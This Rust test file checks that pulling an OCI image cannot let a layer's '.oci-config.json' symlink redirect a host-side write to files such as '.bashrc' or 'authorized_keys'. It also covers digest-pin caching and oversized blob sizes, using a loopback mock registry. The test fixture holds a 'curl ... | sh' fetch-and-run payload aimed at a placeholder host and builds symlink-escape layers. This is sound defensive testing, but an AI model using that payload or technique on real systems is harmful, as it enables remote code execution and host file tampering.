// Copyright Motia LLC and/or licensed to Motia LLC under one or more
// contributor license agreements. Licensed under the Elastic License 2.0;
// you may not use this file except in compliance with the Elastic License 2.0.
// This software is patent protected. We welcome discussions - reach out at team@iii.dev
// See LICENSE and PATENTS files for details.

//! End-to-end checks that pulling an OCI image never lets a layer redirect a
//! host-side metadata write outside the rootfs.
//!
//! After extracting the layers, `pull_and_extract_rootfs` writes the image
//! config blob to `<rootfs>/.oci-config.json`. A layer may legally ship that
//! name as a symlink (absolute or `../..`) pointing at a host file. The config
//! bytes are chosen by the image publisher (the digest check only proves they
//! match the publisher's own manifest), so following the link would let a
//! hostile image overwrite or create an arbitrary file the user can write.
//!
//! The registry is an in-process mock on 127.0.0.1 (plain HTTP is allowed for
//! loopback) and every "host" file lives in a temp dir. The registry client
//! honours `HTTP(S)_PROXY`; behind a proxy, set `NO_PROXY=127.0.0.1` so it
//! reaches the loopback mock directly.

use sandbox_libkrun::cli::worker_manager::oci;
use sha2::Digest;
use std::path::{Path, PathBuf};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// The OCI name of the host arch, which the pull selects.
fn host_arch() -> &'static str {
    match std::env::consts::ARCH {
        "aarch64" => "arm64",
        _ => "amd64",
    }
}

fn sha(b: &[u8]) -> String {
    format!("sha256:{}", hex::encode(sha2::Sha256::digest(b)))
}

#[derive(Clone)]
struct Mock {
    manifest: Vec<u8>,
    config_digest: String,
    config: Vec<u8>,
    layer_digest: String,
    layer: Vec<u8>,
    /// When set, served for every manifest request except the platform
    /// manifest's own digest.
    index: Option<Vec<u8>>,
}

async fn serve(mock: Mock) -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        loop {
            let (mut sock, _) = match listener.accept().await {
                Ok(s) => s,
                Err(_) => return,
            };
            let mock = mock.clone();
            tokio::spawn(async move {
                let mut buf = vec![0u8; 8192];
                let mut n = 0;
                loop {
                    let r = sock.read(&mut buf[n..]).await.unwrap_or(0);
                    if r == 0 {
                        return;
                    }
                    n += r;
                    if buf[..n].windows(4).any(|w| w == b"\r\n\r\n") {
                        break;
                    }
                }
                let req = String::from_utf8_lossy(&buf[..n]).to_string();
                let path = req.split_whitespace().nth(1).unwrap_or("/").to_string();
                let send = |ct: &str, len: u64| {
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: {ct}\r\nContent-Length: {len}\r\nConnection: close\r\n\r\n"
                    )
                };
                if path == "/v2/" {
                    let _ = sock.write_all(send("application/json", 2).as_bytes()).await;
                    let _ = sock.write_all(b"{}").await;
                } else if path.contains("/manifests/") {
                    let (ct, body) = match &mock.index {
                        Some(index) if !path.ends_with(&sha(&mock.manifest)) => {
                            ("application/vnd.oci.image.index.v1+json", index)
                        }
                        _ => ("application/vnd.oci.image.manifest.v1+json", &mock.manifest),
                    };
                    let _ = sock.write_all(send(ct, body.len() as u64).as_bytes()).await;
                    let _ = sock.write_all(body).await;
                } else if path.ends_with(&mock.config_digest) {
                    let ct = "application/octet-stream";
                    let _ = sock
                        .write_all(send(ct, mock.config.len() as u64).as_bytes())
                        .await;
                    let _ = sock.write_all(&mock.config).await;
                } else if path.ends_with(&mock.layer_digest) {
                    let ct = "application/octet-stream";
                    let _ = sock
                        .write_all(send(ct, mock.layer.len() as u64).as_bytes())
                        .await;
                    let _ = sock.write_all(&mock.layer).await;
                } else {
                    let _ = sock
                        .write_all(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                        .await;
                }
                let _ = sock.shutdown().await;
            });
        }
    });
    port
}

/// An image manifest whose descriptors declare the given sizes.
fn manifest(config_digest: &str, config_size: i64, layer_digest: &str, layer_size: i64) -> Vec<u8> {
    format!(
        r#"{{"schemaVersion":2,"mediaType":"application/vnd.oci.image.manifest.v1+json",
"config":{{"mediaType":"application/vnd.oci.image.config.v1+json","digest":"{config_digest}","size":{config_size}}},
"layers":[{{"mediaType":"application/vnd.oci.image.layer.v1.tar+gzip","digest":"{layer_digest}","size":{layer_size}}}]}}"#
    )
    .into_bytes()
}

fn build_mock(layer: Vec<u8>, config: Vec<u8>) -> Mock {
    let config_digest = sha(&config);
    let layer_digest = sha(&layer);
    let manifest = manifest(
        &config_digest,
        config.len() as i64,
        &layer_digest,
        layer.len() as i64,
    );
    Mock {
        manifest,
        config_digest,
        config,
        layer_digest,
        layer,
        index: None,
    }
}

/// A multi-arch image index whose only entry is `manifest` for the host arch.
fn index_for(manifest: &[u8]) -> Vec<u8> {
    format!(
        r#"{{"schemaVersion":2,"mediaType":"application/vnd.oci.image.index.v1+json",
"manifests":[{{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"{}","size":{},
"platform":{{"architecture":"{}","os":"linux"}}}}]}}"#,
        sha(manifest),
        manifest.len(),
        host_arch()
    )
    .into_bytes()
}

/// A layer with a `bin/` dir and, optionally, `.oci-config.json` as a symlink.
fn layer(link_target: Option<&str>) -> Vec<u8> {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    let mut enc = GzEncoder::new(Vec::new(), Compression::fast());
    {
        let mut b = tar::Builder::new(&mut enc);
        let mut h = tar::Header::new_gnu();
        h.set_size(0);
        h.set_mode(0o755);
        h.set_entry_type(tar::EntryType::Directory);
        h.set_cksum();
        b.append_data(&mut h, "bin", std::io::empty()).unwrap();
        if let Some(t) = link_target {
            let mut h = tar::Header::new_gnu();
            h.set_size(0);
            h.set_mode(0o777);
            h.set_entry_type(tar::EntryType::Symlink);
            b.append_link(&mut h, ".oci-config.json", t).unwrap();
        }
        b.finish().unwrap();
    }
    enc.finish().unwrap()
}

/// Publisher-chosen config bytes: a shell payload line followed by JSON that
/// still carries `architecture`.
fn hostile_config() -> Vec<u8> {
    let arch = host_arch();
    format!("curl -s https://example.invalid/x | sh #\n{{\"architecture\":\"{arch}\",\"os\":\"linux\"}}\n")
        .into_bytes()
}

const ORIGINAL: &[u8] = b"# original bashrc\n";

struct Outcome {
    ok: bool,
    dest: PathBuf,
}

async fn pull(tmp: &Path, link_target: Option<&str>, config: Vec<u8>) -> Outcome {
    let cache = tmp.join("cache");
    std::fs::create_dir_all(&cache).unwrap();
    // The staging dir is a sibling of `dest` (<tmp>/cache/.rootfs-slug.tmp-*),
    // so a relative `../../home/...` target resolves inside `tmp`.
    let dest = cache.join("rootfs-slug");
    let port = serve(build_mock(layer(link_target), config)).await;
    let image = format!("127.0.0.1:{port}/evil/base:1");
    let res = oci::pull_and_extract_rootfs(&image, &dest).await;
    if let Err(e) = &res {
        eprintln!("pull error: {e:#}");
    }
    Outcome {
        ok: res.is_ok(),
        dest,
    }
}

fn victim_in(tmp: &Path) -> PathBuf {
    let victim = tmp.join("home/user/.bashrc");
    std::fs::create_dir_all(victim.parent().unwrap()).unwrap();
    std::fs::write(&victim, ORIGINAL).unwrap();
    victim
}

fn assert_config_is_regular_file(dest: &Path, config: &[u8]) {
    let path = dest.join(".oci-config.json");
    let meta = std::fs::symlink_metadata(&path).unwrap();
    assert!(
        meta.file_type().is_file(),
        ".oci-config.json must be a regular file inside the rootfs, got {:?}",
        meta.file_type()
    );
    assert_eq!(std::fs::read(&path).unwrap(), config);
}

#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn config_write_does_not_follow_absolute_symlink_from_layer() {
    let tmp = tempfile::tempdir().unwrap();
    let victim = victim_in(tmp.path());
    let config = hostile_config();

    let out = pull(tmp.path(), Some(victim.to_str().unwrap()), config.clone()).await;

    assert!(out.ok, "pull should still succeed");
    assert_eq!(
        std::fs::read(&victim).unwrap(),
        ORIGINAL,
        "host file overwritten through a `.oci-config.json` symlink shipped in a layer"
    );
    assert_config_is_regular_file(&out.dest, &config);
}

#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn config_write_does_not_follow_relative_escaping_symlink_from_layer() {
    let tmp = tempfile::tempdir().unwrap();
    let victim = victim_in(tmp.path());
    let config = hostile_config();

    let out = pull(tmp.path(), Some("../../home/user/.bashrc"), config.clone()).await;

    assert!(out.ok, "pull should still succeed");
    assert_eq!(
        std::fs::read(&victim).unwrap(),
        ORIGINAL,
        "host file overwritten through a relative `.oci-config.json` symlink"
    );
    assert_config_is_regular_file(&out.dest, &config);
}

#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn dangling_symlink_from_layer_does_not_create_host_file() {
    let tmp = tempfile::tempdir().unwrap();
    let target = tmp.path().join("home/user/.ssh/authorized_keys");
    std::fs::create_dir_all(target.parent().unwrap()).unwrap();
    let config = hostile_config();

    let out = pull(tmp.path(), Some(target.to_str().unwrap()), config.clone()).await;

    assert!(out.ok, "pull should still succeed");
    assert!(
        !target.exists(),
        "host file created through a dangling `.oci-config.json` symlink"
    );
    assert_config_is_regular_file(&out.dest, &config);
}

#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn benign_layer_writes_regular_config_file() {
    let tmp = tempfile::tempdir().unwrap();
    let arch = host_arch();
    let config = format!("{{\"architecture\":\"{arch}\",\"os\":\"linux\"}}").into_bytes();

    let out = pull(tmp.path(), None, config.clone()).await;

    assert!(out.ok);
    assert_config_is_regular_file(&out.dest, &config);
}

/// The rootfs cache records what the pull returns and lets a digest pin
/// reuse the rootfs only when the pin is listed, so the pull must return
/// the digest a pin of this image names, for a tag and for the pin itself.
#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn pull_returns_the_manifest_digest_a_pin_names() {
    let tmp = tempfile::tempdir().unwrap();
    let mock = build_mock(layer(None), b"{}".to_vec());
    let digest = sha(&mock.manifest);
    let port = serve(mock).await;
    let image = format!("127.0.0.1:{port}/evil/base:1");

    let by_tag = oci::pull_and_extract_rootfs(&image, &tmp.path().join("tag"))
        .await
        .unwrap();
    let pinned = format!("{image}@{digest}");
    let by_pin = oci::pull_and_extract_rootfs(&pinned, &tmp.path().join("pin"))
        .await
        .unwrap();

    assert_eq!(by_tag, std::slice::from_ref(&digest));
    assert_eq!(by_pin, [digest]);
}

/// `ensure_rootfs` records the digests it pulled beside the rootfs: a pin of
/// one of them reuses the tag's dir and any other pin misses. For an index
/// that is the index and the platform manifest, and a pin pulled first fills
/// the tag's empty dir.
#[tokio::test(flavor = "multi_thread")]
#[serial_test::serial]
async fn ensure_rootfs_shares_the_tag_dir_only_with_the_pulled_digests() {
    use sandbox_libkrun::cli::rootfs_cache::{ensure_rootfs, resolve_cached};

    let home = tempfile::tempdir().unwrap();
    let prior = std::env::var_os("HOME");
    // SAFETY: #[serial], and every other test in this binary is #[parallel].
    unsafe { std::env::set_var("HOME", home.path()) };
    let other = format!("sha256:{}", "c".repeat(64));

    let mock = build_mock(layer(None), b"{}".to_vec());
    let digest = sha(&mock.manifest);
    let tag = format!("127.0.0.1:{}/evil/base:1", serve(mock).await);
    let shared = ensure_rootfs(&tag, || {}).await.unwrap();
    let pin_hit = resolve_cached(&format!("{tag}@{digest}"));
    let pin_miss = resolve_cached(&format!("{tag}@{other}"));

    let mut mock = build_mock(layer(None), b"{}".to_vec());
    let platform = sha(&mock.manifest);
    let index = index_for(&mock.manifest);
    let index_digest = sha(&index);
    mock.index = Some(index);
    let multi = format!("127.0.0.1:{}/evil/multi:1", serve(mock).await);
    let pinned = ensure_rootfs(&format!("{multi}@{index_digest}"), || {})
        .await
        .unwrap();
    let mut pulled_again = false;
    let by_tag = ensure_rootfs(&multi, || pulled_again = true).await.unwrap();
    let platform_hit = resolve_cached(&format!("{multi}@{platform}"));
    let multi_miss = resolve_cached(&format!("{multi}@{other}"));

    match prior {
        Some(v) => unsafe { std::env::set_var("HOME", v) },
        None => unsafe { std::env::remove_var("HOME") },
    }
    assert!(
        shared.starts_with(home.path()),
        "isolated HOME not honoured"
    );
    assert_eq!(pin_hit, Some(shared));
    assert_eq!(pin_miss, None, "another digest was served this rootfs");
    assert_eq!(pinned, by_tag, "a pin pulled first fills the tag's dir");
    assert!(!pulled_again, "the tag re-pulled what its pin had pulled");
    assert_eq!(platform_hit, Some(by_tag));
    assert_eq!(multi_miss, None);
}

/// Pull from `mock` and return the error the pull must fail with.
async fn pull_error(mock: Mock) -> String {
    let tmp = tempfile::tempdir().unwrap();
    let port = serve(mock).await;
    let image = format!("127.0.0.1:{port}/evil/base:1");
    let res = oci::pull_and_extract_rootfs(&image, &tmp.path().join("rootfs")).await;
    format!("{:#}", res.expect_err("the pull must fail"))
}

/// Descriptor sizes come from the registry. One the allocator cannot satisfy
/// used to be passed to `Vec::with_capacity` and abort the whole process.
#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn absurd_declared_blob_size_fails_the_pull_without_aborting() {
    let mut mock = build_mock(layer(None), b"{}".to_vec());
    let layer_size = mock.layer.len() as i64;
    mock.manifest = manifest(
        &mock.config_digest,
        i64::MAX,
        &mock.layer_digest,
        layer_size,
    );

    let err = pull_error(mock).await;

    assert!(err.contains("image blobs exceed"), "got: {err}");
}

/// A blob that streams past its declared size is refused before it is
/// buffered, so memory stays within the sizes the manifest was checked for.
#[tokio::test(flavor = "multi_thread")]
#[serial_test::parallel]
async fn blob_longer_than_its_descriptor_fails_the_pull() {
    let mut mock = build_mock(layer(None), b"{}".to_vec());
    let layer_size = mock.layer.len() as i64 - 1;
    mock.manifest = manifest(&mock.config_digest, 2, &mock.layer_digest, layer_size);

    let err = pull_error(mock).await;

    assert!(err.contains("layer 1 is larger than"), "got: {err}");
}
